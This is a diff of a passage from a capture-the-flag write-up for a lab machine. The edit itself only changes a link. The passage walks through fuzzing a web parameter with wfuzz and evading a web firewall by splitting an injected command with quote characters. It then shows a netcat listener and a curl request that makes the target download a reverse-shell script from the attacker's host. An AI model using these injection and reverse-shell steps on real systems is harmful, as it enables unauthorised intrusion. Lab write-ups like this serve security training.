@@ -10,7 +10,7 @@ Using dirb to search for directories doesn't really help because there is nothin
 ```sh
 $ wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt --filter="c=403" http://10.10.10.69/sync?FUZZ=\ls
 ```
-This will return only the responses with error code 403 wich will be caused from superwaf while it's trying to block the "ls" comand we gave as a value. The error code 403 was returned while the name of the parameter was ***opt***. Now we have to find the right value for this parameter and bypass the superwaf firewall. The ***'*** symbol as well as the \ symbol, is used in bash to concatenate strings. We can exploit this feature and use it to bypass the firewall. So we create a [reverse.py](https://github.com/pamehabai6/Permission-Denied/blob/master/Write-ups/FluxCapacitor/reverse.py) and upload it to the remote. Next we give it privileges and execute it.
+This will return only the responses with error code 403 wich will be caused from superwaf while it's trying to block the "ls" comand we gave as a value. The error code 403 was returned while the name of the parameter was ***opt***. Now we have to find the right value for this parameter and bypass the superwaf firewall. The ***'*** symbol as well as the \ symbol, is used in bash to concatenate strings. We can exploit this feature and use it to bypass the firewall. So we create a [reverse.py](/FluxCapacitor/reverse.py) and upload it to the remote. Next we give it privileges and execute it.
 ```sh
 $ nc -lvp 1234
 $ curl -s http://10.10.10.69/sync?opt=' wg'et' 'http://10.10.14.10/reverse.py' '-P' 'tmp
